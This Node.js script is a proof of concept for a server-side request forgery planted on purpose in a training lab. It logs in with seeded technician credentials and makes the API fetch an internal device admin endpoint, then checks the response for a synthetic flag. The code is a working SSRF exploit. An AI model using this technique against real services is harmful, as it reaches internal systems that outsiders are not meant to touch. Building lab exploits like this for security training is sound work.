#!/usr/bin/env node
'use strict';

/*
 * poc-v3-ssrf.js — proof-of-concept for lab vulnerability V3 (intentional
 * server-side request forgery in POST /api/diagnostics/fetch).
 *
 * An authenticated TECHNICIAN (seeded credentials, documented in the
 * README — no other token needed, V3 is independent of V1) supplies the
 * target URL in the encrypted request body; the API server fetches it.
 * The target is the internal-only lab device admin endpoint, which the
 * host cannot reach directly. Proof: the fetched body contains the
 * device's synthetic challenge value.
 *
 * Topology proven:  host → api (127.0.0.1:3000) → lab-device:8080
 *                   (NOT host → lab-device — the host has no route there;
 *                    see scripts/verify-device.sh checks 7a/7b)
 *
 * Usage:
 *   node scripts/poc-v3-ssrf.js [--base http://127.0.0.1:3000]
 */
const LabEnvelope = require('../shared/protocol/envelope.js');

const BASE = (process.argv.includes('--base')
  ? process.argv[process.argv.indexOf('--base') + 1]
  : process.env.LAB_BASE) || 'http://127.0.0.1:3000';

const TARGET = 'http://lab-device:8080/api/admin';
const CHALLENGE = 'LAB{ssrf_internal_device_reached}';

function section(title) {
  console.log('\n=== ' + title + ' ===');
}

async function main() {
  section('1. POST /api/session/key (fresh RC4 session over plaintext HTTP)');
  const keyRes = await fetch(BASE + '/api/session/key', { method: 'POST' });
  const session = await keyRes.json();
  if (!keyRes.ok || !session.sessionId || !session.key) {
    throw new Error('session/key failed: HTTP ' + keyRes.status + ' ' + JSON.stringify(session));
  }
  console.log(`sessionId: ${session.sessionId}`);

  async function call(endpoint, payload) {
    const res = await fetch(BASE + endpoint, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(LabEnvelope.seal(session.sessionId, session.key, payload))
    });
    const raw = await res.json();
    if (raw && raw.data) {
      return { status: res.status, body: LabEnvelope.open(session.key, raw) };
    }
    return { status: res.status, body: raw }; // plaintext protocol error
  }

  section("2. POST /api/auth/login as 'tech1' (seeded technician)");
  const login = await call('/api/auth/login', { username: 'tech1', password: 'TechPass!23' });
  if (login.status !== 200 || !login.body.token) {
    throw new Error('login failed: HTTP ' + login.status + ' ' + JSON.stringify(login.body));
  }
  const token = login.body.token;
  console.log(`logged in as: ${login.body.user.username} (role ${login.body.user.role})`);

  section('3. Control: POST /api/diagnostics/run on EQ-1001 (configured target, intended behaviour)');
  const run = await call('/api/diagnostics/run', { token, equipmentId: 1 });
  if (run.status !== 200) {
    throw new Error('diagnostics/run failed: HTTP ' + run.status + ' ' + JSON.stringify(run.body));
  }
  console.log(`configured target: ${run.body.target}`);
  console.log(`device said: ${run.body.body}`);

  section(`4. SSRF: POST /api/diagnostics/fetch target = ${TARGET}`);
  const ssrf = await call('/api/diagnostics/fetch', { token, equipmentId: 1, target: TARGET });
  if (ssrf.status !== 200) {
    throw new Error('diagnostics/fetch failed: HTTP ' + ssrf.status + ' ' + JSON.stringify(ssrf.body));
  }
  console.log(`server-side fetch httpStatus: ${ssrf.body.httpStatus}`);
  console.log('fetched body returned through the API:');
  console.log(ssrf.body.body);

  section('5. Proof check');
  const proofs = [
    ['server performed the request (httpStatus 200)', ssrf.body.httpStatus === 200, ssrf.body.httpStatus],
    ['internal device challenge present in API response', typeof ssrf.body.body === 'string' && ssrf.body.body.includes(CHALLENGE), CHALLENGE],
    ['response came from the API, not the renderer/device', ssrf.body.target === TARGET && ssrf.body.equipmentId === 1, ssrf.body.target]
  ];
  let ok = true;
  for (const [label, pass, shown] of proofs) {
    console.log(`${pass ? 'PASS' : 'FAIL'}  ${label}: ${JSON.stringify(shown)}`);
    ok = ok && pass;
  }

  if (!ok) {
    console.error('\nPOC FAILED — SSRF proof not observed');
    process.exit(1);
  }
  console.log('\nPOC OK — V3 confirmed: the API fetched an attacker-controlled URL server-side');
  console.log(`and returned the internal device challenge ${CHALLENGE}`);
  console.log('via host -> api -> lab-device (the host has no direct route to the device).');
}

main().catch((err) => {
  console.error('[poc-v3-ssrf] ' + err.message);
  process.exit(1);
});
